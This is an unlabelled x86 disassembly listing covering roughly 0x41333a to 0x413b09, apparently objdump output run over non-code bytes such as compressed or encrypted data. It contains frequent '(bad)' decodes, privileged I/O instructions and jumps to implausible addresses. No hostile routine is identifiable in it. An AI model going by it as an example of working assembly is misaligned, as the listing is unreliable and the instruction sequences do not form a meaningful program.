  41333a:	into   
  41333b:	jg     0x4132fd
  41333d:	cmp    al,0xf8
  41333f:	inc    esp
  413340:	xlat   BYTE PTR ds:[ebx]
  413341:	ja     0x413342
  413343:	outs   dx,DWORD PTR ds:[esi]
  413344:	cmp    cl,BYTE PTR [ebx+0x48]
  413347:	pop    ss
  413348:	mov    al,0x62
  41334a:	adc    al,0x7d
  41334c:	xchg   DWORD PTR [edi+0x3d],edx
  41334f:	repz dec edi
  413351:	repnz push ebx
  413353:	gs mov dh,0x5
  413356:	mov    eax,0x9136f3da
  41335b:	aam    0x3b
  41335d:	add    ecx,DWORD PTR [ecx-0x5c]
  413360:	xchg   ecx,eax
  413361:	jle    0x41337e
  413363:	sbb    DWORD PTR [edx+0x23f07594],edi
  413369:	aad    0x7b
  41336b:	outs   dx,DWORD PTR ds:[esi]
  41336c:	arpl   di,cx
  41336e:	push   0x2
  413370:	popf   
  413371:	mov    esi,0x1d68ee80
  413376:	cld    
  413377:	das    
  413378:	inc    edi
  413379:	(bad)  
  41337a:	scas   al,BYTE PTR es:[edi]
  41337b:	inc    eax
  41337c:	and    ebx,edi
  41337e:	push   edx
  41337f:	stos   DWORD PTR es:[edi],eax
  413380:	div    BYTE PTR [esi+0x4d897163]
  413386:	add    ecx,edx
  413388:	xchg   edx,eax
  413389:	push   cs
  41338a:	pop    edi
  41338b:	scas   al,BYTE PTR es:[edi]
  41338c:	fild   WORD PTR [esi]
  41338e:	cld    
  41338f:	imul   DWORD PTR [edi]
  413391:	pusha  
  413392:	push   cs
  413393:	or     eax,0xc09aa669
  413398:	cmp    al,BYTE PTR [edx+0x6a]
  41339b:	mov    al,0xcc
  41339d:	data16 in al,0x15
  4133a0:	popf   
  4133a1:	jge    0x4133a1
  4133a3:	sub    al,0x6
  4133a5:	push   esi
  4133a6:	xor    al,0xfc
  4133a8:	sub    dl,BYTE PTR [ebx+0x5561129b]
  4133ae:	(bad)  
  4133af:	and    DWORD PTR [edi],ebp
  4133b1:	rcl    BYTE PTR [ecx-0x9],cl
  4133b4:	in     al,0x47
  4133b6:	inc    eax
  4133b7:	push   dx
  4133b9:	xchg   DWORD PTR [ebx-0x471cdb12],ecx
  4133bf:	push   edx
  4133c0:	adc    ebx,DWORD PTR [edx-0x56]
  4133c3:	adc    DWORD PTR [edi+0x20d31389],esi
  4133c9:	(bad)  
  4133ca:	int    0x3a
  4133cc:	cwde   
  4133cd:	fstp   TBYTE PTR [eax+0x6952910d]
  4133d3:	jmp    0x4133a5
  4133d5:	adc    DWORD PTR [ebp-0x32a62a79],edi
  4133db:	aad    0x36
  4133dd:	retf   0x6ff7
  4133e0:	xchg   BYTE PTR gs:[edi+0x3228a54],bh
  4133e7:	dec    DWORD PTR [esi]
  4133e9:	lock push ebp
  4133eb:	dec    edi
  4133ec:	push   ebp
  4133ed:	stos   DWORD PTR es:[edi],eax
  4133ee:	xor    bh,BYTE PTR [edi-0x55]
  4133f1:	mov    dh,0x8a
  4133f3:	sbb    BYTE PTR [ebp-0x2495337e],bl
  4133f9:	mov    BYTE PTR [eax-0x741382c6],bl
  4133ff:	and    BYTE PTR [edi],bh
  413401:	add    bl,BYTE PTR [edi-0x5c4f62aa]
  413407:	(bad)  
  413409:	or     al,BYTE PTR [edi-0x37]
  41340c:	and    esi,DWORD PTR [ebx-0x2814023f]
  413412:	retf   
  413413:	xchg   esp,eax
  413414:	shl    ecx,1
  413416:	push   ebx
  413417:	mov    edx,0x498c8375
  41341c:	jae    0x4133de
  41341e:	mov    dh,0xef
  413420:	fstp   TBYTE PTR [ebx]
  413422:	sub    dh,BYTE PTR [ecx+0x74]
  413425:	jecxz  0x4133e6
  413427:	fidiv  WORD PTR [ebx-0x58]
  41342a:	out    0x6b,al
  41342c:	xor    al,0xcc
  41342e:	or     eax,0xdf53f598
  413433:	pop    ebp
  413434:	push   ss
  413435:	xor    bl,BYTE PTR [ecx+0x2a]
  413438:	shl    ah,cl
  41343a:	int    0x64
  41343c:	lods   eax,DWORD PTR ds:[esi]
  41343d:	or     bl,BYTE PTR [edi+eax*8-0x6c01cd81]
  413444:	mov    ebx,ebp
  413446:	loope  0x413443
  413448:	aas    
  413449:	sub    cl,BYTE PTR [ecx]
  41344b:	pop    ss
  41344c:	jg     0x413489
  41344e:	iret   
  41344f:	pop    eax
  413450:	jnp    0x4133e6
  413452:	jl     0x4133e4
  413454:	mov    bl,0xdc
  413456:	popf   
  413457:	mov    WORD PTR [ebp-0x4e],cs
  41345a:	cmp    ebp,DWORD PTR [ecx+0x3d]
  41345d:	in     eax,0xe4
  41345f:	cmp    DWORD PTR [esi-0x7fbb7f68],ebp
  413465:	retf   0x759f
  413468:	in     al,0xd9
  41346a:	mov    bl,BYTE PTR [ebx-0x5b645e48]
  413470:	test   ch,bh
  413472:	outs   dx,DWORD PTR ds:[esi]
  413473:	or     eax,0x30ea02c5
  413478:	jno    0x41345d
  41347a:	add    DWORD PTR [ebx],ecx
  41347c:	sub    dl,bl
  41347e:	mov    esp,0xa73a7349
  413483:	scas   al,BYTE PTR es:[edi]
  413484:	sub    cl,cl
  413486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413487:	fst    st(0)
  413489:	pop    edx
  41348a:	inc    esi
  41348b:	jle    0x4134df
  41348d:	lahf   
  41348e:	pop    ss
  41348f:	xor    ch,cl
  413491:	pop    esi
  413492:	in     al,0xfc
  413494:	mov    esi,0x724eb6b7
  413499:	out    dx,al
  41349a:	sti    
  41349b:	repz stc 
  41349d:	out    0xb0,eax
  41349f:	and    BYTE PTR gs:[ebx],ah
  4134a2:	in     eax,dx
  4134a3:	shl    DWORD PTR [ecx],cl
  4134a5:	cs xchg ebx,eax
  4134a7:	xchg   esp,eax
  4134a8:	xchg   ebx,eax
  4134a9:	sbb    bl,BYTE PTR [esi-0x6c]
  4134ac:	or     eax,0xf8f2f724
  4134b1:	mov    ch,0x87
  4134b3:	jnp    0x41350f
  4134b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134b6:	xchg   ebp,eax
  4134b7:	xor    BYTE PTR [edx+0x6f5e0c16],0xe2
  4134be:	or     BYTE PTR [edx-0x7],ah
  4134c1:	dec    edx
  4134c2:	neg    BYTE PTR [eax-0x5f]
  4134c5:	test   eax,0x4b199279
  4134ca:	cwde   
  4134cb:	add    ebp,DWORD PTR [esi+0x63]
  4134ce:	dec    edx
  4134cf:	gs test eax,0x2ceeccf7
  4134d5:	outs   dx,DWORD PTR ds:[esi]
  4134d6:	inc    ebp
  4134d7:	stos   BYTE PTR es:[edi],al
  4134d8:	(bad)  
  4134d9:	cmp    eax,0x85791bbf
  4134de:	mov    ah,0x46
  4134e0:	or     DWORD PTR [edi+0x48],esi
  4134e3:	fcomp  DWORD PTR [ebx+ebx*4+0xe]
  4134e7:	push   0x53
  4134e9:	push   eax
  4134ea:	push   ds
  4134eb:	add    ebp,esi
  4134ed:	in     al,0x74
  4134ef:	es mov bl,0xdc
  4134f2:	popa   
  4134f3:	ret    
  4134f4:	or     DWORD PTR [ecx-0x66f480c7],0xb2a24277
  4134fe:	dec    ebx
  4134ff:	adc    eax,0x831d1335
  413504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413505:	(bad)  
  413506:	out    dx,al
  413507:	and    BYTE PTR [edi+0x64],dl
  41350a:	mov    WORD PTR [ecx+esi*2],cs
  41350d:	dec    ebp
  41350e:	xor    al,0x7b
  413510:	cmp    al,0x82
  413512:	jg     0x4134ff
  413514:	les    ecx,FWORD PTR [ebx+edx*1+0x9]
  413518:	jae    0x413570
  41351a:	xor    al,0xe
  41351c:	adc    ebp,DWORD PTR [eax]
  41351e:	inc    eax
  41351f:	sub    ebx,edx
  413521:	pop    ebx
  413522:	out    dx,al
  413523:	lods   al,BYTE PTR ds:[esi]
  413524:	test   al,0x60
  413526:	cmp    cl,BYTE PTR [eax-0x1e89407e]
  41352c:	mov    ebp,0x213ce0c8
  413531:	retf   0xc1dd
  413534:	jbe    0x413540
  413536:	pop    ds
  413537:	add    esp,edx
  413539:	arpl   WORD PTR [esi-0x5],di
  41353c:	dec    ecx
  41353d:	lods   al,BYTE PTR ds:[esi]
  41353e:	push   ebp
  41353f:	push   esp
  413540:	les    esi,FWORD PTR [ebx]
  413542:	mov    dl,0x65
  413544:	xchg   cl,dl
  413546:	call   0xd45d:0x8712d36a
  41354d:	pop    ds
  41354e:	push   ebx
  41354f:	sbb    esp,ebp
  413551:	(bad)  
  413552:	call   0x524648a6
  413557:	or     ch,ch
  413559:	daa    
  41355a:	pusha  
  41355b:	xchg   ebp,eax
  41355c:	retf   0x4258
  41355f:	stos   DWORD PTR es:[edi],eax
  413560:	jg     0x413500
  413562:	mov    bl,0xfb
  413564:	sub    al,0x1a
  413566:	ins    BYTE PTR es:[edi],dx
  413567:	push   ecx
  413568:	push   esp
  413569:	or     DWORD PTR [eax+0x171e1845],ecx
  41356f:	jg     0x413560
  413571:	adc    eax,0xd2f07e70
  413576:	scas   al,BYTE PTR es:[edi]
  413577:	idiv   dh
  413579:	jnp    0x413549
  41357b:	push   cs
  41357c:	mov    ch,0x7f
  41357e:	push   ds
  41357f:	ror    bh,cl
  413581:	call   0xa4aa:0xaacdf8c
  413588:	mov    eax,0xe1ac96ec
  41358d:	test   eax,0xeab1dca0
  413592:	xor    BYTE PTR [ebp+0x4e1fd4bf],dh
  413598:	test   esp,ebx
  41359a:	(bad)  [eax-0x5ef34c10]
  4135a0:	add    BYTE PTR ds:0x23e33c9b,bl
  4135a6:	aad    0x56
  4135a8:	(bad)  
  4135a9:	mov    esp,0xf62ff343
  4135ae:	jmp    0x35a3a49b
  4135b3:	jb     0x4135ee
  4135b5:	icebp  
  4135b6:	mov    dl,0x14
  4135b8:	mov    ecx,0x12d06ddc
  4135bd:	xchg   esp,eax
  4135be:	das    
  4135bf:	ds cmp al,0xd5
  4135c2:	mov    ebp,0xd44b5101
  4135c7:	not    bl
  4135c9:	out    0xe2,al
  4135cb:	fstp   st(3)
  4135cd:	pop    es
  4135ce:	xor    esp,DWORD PTR [ebx+ebp*8+0x11]
  4135d2:	and    BYTE PTR [ebx+edi*8+0x1b],bh
  4135d6:	fwait
  4135d7:	int    0x1d
  4135d9:	inc    edx
  4135da:	fist   WORD PTR [ebx-0x7b]
  4135dd:	sahf   
  4135de:	and    eax,0xfe21d23f
  4135e3:	call   0x8d43721e
  4135e8:	cmp    eax,DWORD PTR [ecx]
  4135ea:	pushf  
  4135eb:	sub    eax,DWORD PTR [edx+0x2d1dbad5]
  4135f1:	cmp    eax,0x4c4203cb
  4135f6:	cmp    BYTE PTR [ebp+eiz*1-0x26],0x0
  4135fb:	adc    ebp,esi
  4135fd:	dec    edi
  4135fe:	sub    al,0x88
  413600:	xor    al,0xce
  413602:	inc    eax
  413603:	jmp    0x933b897c
  413608:	mov    edi,0x9b5b7f67
  41360e:	(bad)  
  41360f:	fisubr DWORD PTR [ecx-0x64]
  413612:	scas   al,BYTE PTR es:[edi]
  413613:	xchg   esp,eax
  413614:	arpl   dx,bx
  413616:	ror    DWORD PTR [eax-0x58],cl
  413619:	mov    al,ds:0x31db120f
  41361e:	mov    dl,0x5a
  413620:	jmp    0x4135ff
  413622:	cwde   
  413623:	push   esi
  413624:	cmp    BYTE PTR [esi+ebp*4-0x55],bh
  413628:	mov    BYTE PTR [ebx],cl
  41362a:	xlat   BYTE PTR ds:[ebx]
  41362b:	push   ss
  41362c:	daa    
  41362d:	fwait
  41362e:	cmp    eax,DWORD PTR ds:0xf6ac79c
  413634:	mov    esp,0xca7790b1
  413639:	ja     0x413694
  41363b:	sub    BYTE PTR [eax],bh
  41363d:	dec    ecx
  41363e:	fistp  DWORD PTR [edx-0x6b768778]
  413644:	or     al,0xa7
  413646:	stos   DWORD PTR es:[edi],eax
  413647:	xor    eax,0x951680a5
  41364c:	ins    DWORD PTR es:[edi],dx
  41364d:	lock pusha 
  41364f:	gs aaa 
  413651:	imul   edi,DWORD PTR [eax-0x404c5b3d],0xffffffe4
  413658:	mov    esp,0xb5ec51c5
  41365d:	sar    DWORD PTR [edi],cl
  41365f:	cmc    
  413660:	mov    esi,0x42671e45
  413665:	jno    0x41363e
  413667:	call   0xf5e8ced2
  41366c:	repz dec ebp
  41366e:	in     eax,dx
  41366f:	jmp    0xe2ce:0xd08558be
  413676:	sub    eax,DWORD PTR [ebx]
  413678:	(bad)  
  413679:	hlt    
  41367a:	repnz les esi,FWORD PTR ds:0x3c378319
  413681:	adc    eax,0x668f92fe
  413686:	(bad)  
  413687:	cli    
  413688:	sub    DWORD PTR [ebx+0x58],edx
  41368b:	push   edi
  41368c:	out    dx,eax
  41368d:	xor    al,0xf4
  41368f:	fsub   st(3),st
  413691:	add    cl,BYTE PTR [eax+0x62759c2f]
  413697:	ja     0x4136d5
  413699:	ja     0x4136a4
  41369b:	rcl    BYTE PTR [eax+0x66],cl
  41369e:	pmuludq mm6,QWORD PTR ds:[eax+edi*4]
  4136a3:	dec    edx
  4136a4:	mov    es:0x497c527b,eax
  4136aa:	add    eax,0x30ace742
  4136af:	mov    bh,0x9
  4136b1:	push   0xffffffaa
  4136b3:	pop    esi
  4136b5:	jne    0x413686
  4136b7:	shr    BYTE PTR [eax-0x50],1
  4136ba:	addr16 pop ebp
  4136bc:	xchg   esp,eax
  4136bd:	or     eax,0x2ce50134
  4136c2:	aad    0xd6
  4136c4:	inc    ecx
  4136c5:	pop    ecx
  4136c6:	fsin   
  4136c8:	out    0xad,eax
  4136ca:	inc    eax
  4136cb:	sbb    edi,DWORD PTR ds:0x28fee40a
  4136d2:	test   eax,0x6cfbcff
  4136d7:	(bad)
  4136da:	jge    0x413724
  4136dc:	pop    edx
  4136dd:	daa    
  4136de:	popf   
  4136df:	outs   dx,DWORD PTR ss:[esi]
  4136e1:	cdq    
  4136e2:	nop
  4136e3:	mov    esi,0x975d3adf
  4136e8:	sbb    esi,0x30
  4136eb:	or     BYTE PTR [ecx+edx*8],0xbb
  4136ef:	jno    0x41375c
  4136f1:	sbb    BYTE PTR ds:0xfa57ec9b,al
  4136f7:	loopne 0x413743
  4136f9:	pop    es
  4136fa:	adc    BYTE PTR [edx-0x31],ah
  4136fd:	mov    edi,0x7e0f980a
  413702:	adc    cl,BYTE PTR ds:0x54041f88
  413708:	dec    eax
  413709:	icebp  
  41370a:	sar    BYTE PTR [ecx+ebp*8-0x159c4b8d],0x40
  413712:	aad    0xc8
  413714:	mov    eax,ss
  413716:	out    dx,al
  413717:	sbb    bl,BYTE PTR [edi-0x4e]
  41371a:	mov    ch,0xe8
  41371c:	fidiv  DWORD PTR [esi+edi*8-0x5d]
  413720:	push   eax
  413721:	jge    0x4136f2
  413723:	dec    esi
  413724:	dec    ecx
  413725:	pop    esi
  413726:	jbe    0x4136e3
  413728:	mov    bl,al
  41372a:	aam    0xa8
  41372c:	mov    dh,0xed
  41372e:	sbb    DWORD PTR [ebx+0x52],edx
  413731:	gs xchg esi,eax
  413733:	popf   
  413734:	dec    eax
  413735:	mov    bl,0x9e
  413737:	fcomp  QWORD PTR [edi+0x28ec61eb]
  41373d:	cmp    DWORD PTR [edi+ebx*8],ebx
  413740:	inc    edi
  413741:	lahf   
  413742:	cld    
  413743:	stc    
  413744:	retf   0x949e
  413747:	mov    esp,0x372c35b8
  41374c:	dec    ebp
  41374d:	fst    DWORD PTR [ecx]
  41374f:	outs   dx,BYTE PTR ds:[esi]
  413750:	repz jmp 0x4136e6
  413753:	fs out dx,al
  413755:	mov    DWORD PTR [ecx+ebx*4],ecx
  413758:	pop    es
  413759:	cli    
  41375a:	xor    eax,0x7e68e2b9
  41375f:	cmp    cl,BYTE PTR [esi-0x21]
  413762:	or     esi,DWORD PTR [ebx+0x5475fcfc]
  413768:	arpl   WORD PTR [ecx-0x682a5600],dx
  41376e:	push   0x9c1e7e10
  413773:	cmp    BYTE PTR [edx-0x7],0xd0
  413777:	rol    bh,cl
  413779:	mov    bh,0xd5
  41377b:	fs pop ds
  41377d:	addr16 jl 0x41379c
  413780:	mov    ?,WORD PTR [eax+0x72]
  413783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413784:	outs   dx,BYTE PTR ds:[esi]
  413785:	pusha  
  413786:	ret    0x9241
  413789:	mov    esi,0x59d57e72
  41378e:	ret    0x62fe
  413791:	jns    0x4137df
  413793:	jmp    0xbb9193f4
  413798:	mov    al,BYTE PTR [esi]
  41379a:	js     0x4137ba
  41379c:	adc    al,0x67
  41379e:	in     al,dx
  41379f:	jmp    0x3d46823e
  4137a4:	xchg   ebp,eax
  4137a5:	call   0x67b8:0x85007dac
  4137ac:	js     0x413736
  4137ae:	and    al,0x41
  4137b0:	popf   
  4137b1:	pop    edi
  4137b2:	lods   eax,DWORD PTR ds:[esi]
  4137b3:	add    ah,bh
  4137b5:	mov    DWORD PTR [esi],edx
  4137b7:	push   ecx
  4137b8:	pop    esi
  4137b9:	outs   dx,DWORD PTR ds:[esi]
  4137ba:	hlt    
  4137bb:	rcr    dh,0x9b
  4137be:	mov    bl,0x2b
  4137c0:	sbb    cl,BYTE PTR [edx]
  4137c2:	jo     0x4137c4
  4137c4:	rcl    edi,0x3d
  4137c7:	jns    0x413809
  4137c9:	push   eax
  4137ca:	or     eax,0xd22d74a9
  4137cf:	(bad)  
  4137d0:	mov    cl,0xcf
  4137d2:	cmc    
  4137d3:	cwde   
  4137d4:	and    DWORD PTR [edi+0x3],ecx
  4137d7:	fst    st(7)
  4137d9:	push   esp
  4137da:	mov    ah,0x2e
  4137dc:	jnp    0x413839
  4137de:	adc    al,0xc2
  4137e0:	(bad)  
  4137e1:	mov    ebp,0xd2769986
  4137e6:	dec    esi
  4137e7:	dec    eax
  4137e8:	loopne 0x413857
  4137ea:	mov    ecx,0x991bbe68
  4137ef:	es jecxz 0x41380e
  4137f2:	sub    eax,0xc7d4809a
  4137f7:	pop    esi
  4137f8:	out    0x7f,eax
  4137fa:	jb     0x413855
  4137fc:	rcl    DWORD PTR [esi+0x727d969e],1
  413802:	in     al,0xb2
  413804:	shl    BYTE PTR [ecx-0x7f],cl
  413807:	nop
  413808:	mov    bl,0x7b
  41380a:	out    dx,al
  41380b:	adc    BYTE PTR [ebx-0x36a89055],cl
  413811:	loope  0x41388f
  413813:	retf   0xd7b5
  413816:	adc    dh,bh
  413818:	(bad)  
  413819:	push   esi
  41381a:	clc    
  41381b:	mov    ecx,DWORD PTR [eax+0x2d]
  41381e:	shl    DWORD PTR [ecx-0x72],1
  413821:	pushf  
  413822:	jo     0x4137ec
  413824:	jmp    0xb84f:0xe6389313
  41382b:	push   0x72
  41382d:	cmp    BYTE PTR [edi-0x48],0x39
  413831:	fbstp  TBYTE PTR [ebp-0x6e]
  413834:	and    edi,DWORD PTR [edi]
  413836:	sub    eax,0x82712dd3
  41383b:	xchg   edx,eax
  41383c:	dec    ebx
  41383d:	xchg   edx,eax
  41383e:	jnp    0x41386e
  413840:	test   BYTE PTR [ecx],cl
  413842:	dec    esi
  413843:	cmp    DWORD PTR [esi],edi
  413845:	mov    bh,0x40
  413847:	xlat   BYTE PTR ds:[ebx]
  413848:	pop    ds
  413849:	fwait
  41384a:	or     ch,BYTE PTR [ebp+0x586c819a]
  413850:	inc    edx
  413851:	push   ebx
  413852:	jl     0x4138ca
  413854:	clc    
  413855:	cld    
  413856:	jo     0x4138a9
  413858:	data16 int3 
  41385a:	push   0x48
  41385c:	push   ss
  41385d:	xchg   esi,eax
  41385e:	xor    eax,0x2eeaff33
  413863:	je     0x41388a
  413865:	cmp    DWORD PTR [eax+0x13],ebp
  413868:	cmp    al,bl
  41386a:	out    0x27,eax
  41386c:	fcom   DWORD PTR [ecx]
  41386e:	je     0x413837
  413870:	add    al,0xca
  413872:	mov    DWORD PTR [edx+0x43],edx
  413875:	data16 jg 0x413824
  413878:	jns    0x413835
  41387a:	or     cl,bl
  41387c:	xchg   edi,eax
  41387d:	cdq    
  41387e:	fcmovnbe st,st(7)
  413880:	lods   eax,DWORD PTR ds:[esi]
  413881:	cld    
  413882:	inc    eax
  413883:	test   DWORD PTR [edx+0x40e3c503],ebx
  413889:	add    dh,BYTE PTR [edx+0x59bbd486]
  41388f:	push   es
  413890:	jle    0x413858
  413892:	pop    ecx
  413893:	enter  0x7f02,0x6
  413897:	popf   
  413898:	mov    edi,0x763ef003
  41389d:	or     BYTE PTR [ebx],ch
  41389f:	inc    ebp
  4138a0:	jo     0x41390c
  4138a2:	push   ds
  4138a3:	push   ss
  4138a4:	(bad)  
  4138a5:	jb     0x41386b
  4138a7:	inc    edi
  4138a8:	push   ecx
  4138a9:	jb     0x4138b0
  4138ab:	in     eax,0x48
  4138ad:	ror    BYTE PTR [ecx+0x3eff3e89],1
  4138b3:	mov    ebx,0x3b81df78
  4138b8:	push   cs
  4138b9:	xchg   edx,eax
  4138ba:	xchg   ebp,eax
  4138bb:	aad    0x99
  4138bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138be:	out    dx,al
  4138bf:	aas    
  4138c0:	inc    ecx
  4138c1:	nop
  4138c2:	jne    0x4138a6
  4138c4:	fidiv  DWORD PTR [esi+ecx*2-0x19]
  4138c8:	aaa    
  4138c9:	adc    BYTE PTR [esi+edi*8-0x40],ah
  4138cd:	mov    bh,0x5
  4138cf:	fidivr DWORD PTR [ebx-0x163f37b6]
  4138d5:	hlt    
  4138d6:	adc    edx,DWORD PTR [ebp-0x5a]
  4138d9:	popa   
  4138da:	cmp    al,0x2a
  4138dc:	xrstor [ebp+0x616ffb3e]
  4138e3:	adc    ebp,ebp
  4138e5:	mov    dh,0x9e
  4138e7:	ret    
  4138e8:	popa   
  4138e9:	inc    ebp
  4138ea:	test   bh,bh
  4138ec:	jae    0x4138b1
  4138ee:	or     DWORD PTR [edi],0xffffffb1
  4138f1:	bound  esp,QWORD PTR [ebx+ebx*1-0x60d4546e]
  4138f8:	mov    eax,ds:0x1a3a6225
  4138fd:	dec    eax
  4138fe:	xchg   DWORD PTR [ebp+0x65595075],edi
  413904:	sub    eax,0x7bc70d49
  413909:	xor    bh,BYTE PTR [esi+0x497b8766]
  41390f:	mov    ebx,0x6f411422
  413914:	dec    eax
  413915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413916:	or     BYTE PTR [eax+0x49],dh
  413919:	lea    ecx,[esi+0x49]
  41391c:	mov    bh,0xc
  41391e:	call   0xef6c:0x26777772
  413925:	cmp    BYTE PTR [eax],dl
  413927:	(bad)  
  413928:	xchg   edx,eax
  413929:	ret    0x61a2
  41392c:	xor    bh,BYTE PTR [eax-0x7]
  41392f:	cmp    ebx,DWORD PTR [edx-0x1498c318]
  413935:	arpl   WORD PTR [ecx+0x3],cx
  413938:	or     ecx,DWORD PTR [ebp-0x29]
  41393b:	ins    BYTE PTR es:[edi],dx
  41393c:	push   edx
  41393d:	ror    BYTE PTR [ecx],cl
  41393f:	xlat   BYTE PTR ds:[ebx]
  413940:	int3   
  413941:	loopne 0x413981
  413943:	enter  0x22b7,0xf9
  413947:	push   esi
  413948:	aaa    
  413949:	sbb    BYTE PTR [ebx+0x31],cl
  41394c:	ins    BYTE PTR es:[edi],dx
  41394d:	bndldx (bad),[edx+0x4a]
  413951:	push   cs
  413952:	mov    cl,0x9b
  413954:	push   0x4
  413956:	add    al,0xee
  413958:	cdq    
  413959:	jle    0x41391e
  41395b:	jns    0x4139c8
  41395d:	jge    0x4139be
  41395f:	add    ebp,0x769f0828
  413965:	hlt    
  413966:	out    dx,al
  413967:	push   edi
  413968:	ror    BYTE PTR [eax-0x56],0x7b
  41396c:	mov    ah,0xe2
  41396e:	push   es
  41396f:	fadd   DWORD PTR [esi-0x338f2c21]
  413975:	loopne 0x41392d
  413977:	neg    ch
  413979:	add    DWORD PTR [ecx-0x2e],0xffffffee
  41397d:	fist   WORD PTR [ebp+0x172b78a0]
  413983:	and    cl,BYTE PTR [esp+eiz*8+0x6d]
  413987:	into   
  413988:	mov    esp,0x3e22758
  41398d:	fwait
  41398e:	das    
  41398f:	in     eax,0x3d
  413991:	jge    0x41396b
  413993:	ins    DWORD PTR es:[edi],dx
  413994:	fadd   st(2),st
  413996:	leave  
  413997:	lea    edx,[eax+0x5916695b]
  41399d:	adc    BYTE PTR [edx+0x5f],cl
  4139a0:	cmp    eax,0x418c5116
  4139a5:	push   cs
  4139a6:	sar    ah,cl
  4139a8:	retf   0x39c6
  4139ab:	aam    0x2
  4139ad:	outs   dx,BYTE PTR ds:[esi]
  4139ae:	adc    al,0x48
  4139b0:	stc    
  4139b1:	jns    0x413977
  4139b3:	jle    0x413a32
  4139b5:	imul   BYTE PTR [ecx+0x195a4458]
  4139bb:	fmul   DWORD PTR [ebx+ecx*2+0x104b58b4]
  4139c2:	cmp    eax,0x47ec6617
  4139c7:	jnp    0x413963
  4139c9:	push   ebp
  4139ca:	mov    cl,0xae
  4139cc:	mov    ch,0x2a
  4139ce:	push   ss
  4139cf:	push   ebp
  4139d0:	dec    esi
  4139d1:	and    DWORD PTR ds:0x37da8fa7,ecx
  4139d7:	hlt    
  4139d8:	adc    BYTE PTR [eax-0x73],0xcf
  4139dc:	scas   eax,DWORD PTR es:[edi]
  4139dd:	pop    eax
  4139de:	lahf   
  4139df:	pusha  
  4139e0:	jmp    0x4139e9
  4139e2:	mov    bl,0x54
  4139e4:	ds pop ecx
  4139e6:	jle    0x413a3e
  4139e8:	call   0x7fcfefec
  4139ed:	outs   dx,DWORD PTR ds:[esi]
  4139ee:	in     al,dx
  4139ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f0:	cmp    edi,DWORD PTR [esi-0xa]
  4139f3:	or     BYTE PTR [ecx+0x2b3137cf],bh
  4139f9:	ds jns 0x4139d7
  4139fc:	dec    eax
  4139fd:	mov    ds:0xe8884157,al
  413a02:	inc    ecx
  413a03:	dec    edx
  413a04:	mov    al,ds:0x295a4e7a
  413a09:	inc    edi
  413a0a:	xchg   ebx,eax
  413a0b:	ss aam 0x15
  413a0e:	scas   al,BYTE PTR es:[edi]
  413a0f:	sbb    esi,DWORD PTR [ecx]
  413a11:	push   edi
  413a12:	stos   BYTE PTR es:[edi],al
  413a13:	push   eax
  413a14:	inc    ecx
  413a15:	xchg   DWORD PTR [ebx+ebp*2+0x6f05b20f],edx
  413a1c:	mov    ds:0x516e41b7,eax
  413a21:	push   es
  413a22:	sbb    BYTE PTR [edx-0x4f],dh
  413a25:	mov    cl,0x6a
  413a27:	fidivr WORD PTR [edx+esi*1]
  413a2a:	inc    edx
  413a2b:	fld    DWORD PTR [di+0x5b2]
  413a30:	inc    esp
  413a31:	mov    eax,ds:0x99c4c55f
  413a36:	loop   0x413a59
  413a38:	cs dec edx
  413a3a:	jnp    0x413a45
  413a3c:	daa    
  413a3d:	jnp    0x413a30
  413a3f:	mov    esp,0xc7c1ef74
  413a44:	mov    dl,0x1c
  413a46:	popf   
  413a47:	sub    eax,0xacabeed1
  413a4c:	or     al,bl
  413a4e:	lahf   
  413a4f:	xchg   esp,eax
  413a50:	call   0xf662:0x466aafd6
  413a57:	pop    ds
  413a58:	xchg   esi,eax
  413a59:	push   edi
  413a5a:	mov    ebx,0xcb57f621
  413a5f:	add    eax,0xe4c513aa
  413a64:	dec    esp
  413a65:	pusha  
  413a66:	outs   dx,DWORD PTR ds:[esi]
  413a67:	in     eax,0x64
  413a69:	fcmovne st,st(3)
  413a6b:	cmc    
  413a6c:	stos   DWORD PTR es:[edi],eax
  413a6d:	jg     0x413a5d
  413a6f:	mov    eax,0xcad7a90f
  413a74:	xchg   ebp,eax
  413a75:	es mov esi,0x4b5103a3
  413a7b:	std    
  413a7c:	or     esi,DWORD PTR [edx+0x78]
  413a7f:	jb     0x413af0
  413a81:	(bad)  
  413a82:	xor    al,0x4c
  413a84:	dec    ecx
  413a85:	pop    eax
  413a86:	mov    al,0xd4
  413a88:	sub    edx,esi
  413a8a:	adc    edx,DWORD PTR [edi+0xc1c8e03]
  413a90:	neg    DWORD PTR [edi]
  413a92:	lods   al,BYTE PTR ss:[esi]
  413a94:	push   eax
  413a95:	add    BYTE PTR [edx+0x55728ef4],0xb
  413a9c:	retf   
  413a9d:	ret    
  413a9e:	pop    ecx
  413a9f:	std    
  413aa0:	addr16 retf 
  413aa2:	idiv   BYTE PTR [edi+0x30827adb]
  413aa8:	loopne 0x413a6c
  413aaa:	out    dx,eax
  413aab:	pop    ebp
  413aac:	clc    
  413aad:	lea    esp,[ebp+0x12]
  413ab0:	mov    ebp,0x2a206592
  413ab5:	and    BYTE PTR [ecx],dh
  413ab7:	mov    edx,0xb179742
  413abc:	add    dh,BYTE PTR [ebx-0x4b77f526]
  413ac2:	push   0xdba63ff1
  413ac7:	shl    BYTE PTR [ebx-0xc],0xa3
  413acb:	and    ebp,DWORD PTR [ebx]
  413acd:	push   ebp
  413ace:	sbb    edx,edi
  413ad0:	inc    edi
  413ad2:	add    al,0x47
  413ad4:	xor    ch,BYTE PTR [edi+0x76]
  413ad7:	imul   ecx,DWORD PTR [ebx-0x51],0xfffffff4
  413adb:	pop    ebp
  413adc:	mov    edx,0x90538565
  413ae1:	pop    ds
  413ae2:	xchg   BYTE PTR [ebx+edx*2+0x5f],dh
  413ae6:	into   
  413ae7:	mov    esp,0x60bf6b4c
  413aec:	cwde   
  413aed:	pop    ecx
  413aee:	jmp    0x61ac1c2d
  413af3:	mov    ds:0x73eecb47,al
  413af8:	push   es
  413af9:	mov    ch,0x66
  413afb:	mov    ds:0xd91cab1d,al
  413b00:	clc    
  413b01:	sbb    DWORD PTR [ebp+0x30],eax
  413b04:	lahf   
  413b05:	das    
  413b06:	push   ss
  413b07:	arpl   WORD PTR [edx],di
  413b09:	in     eax,0x40
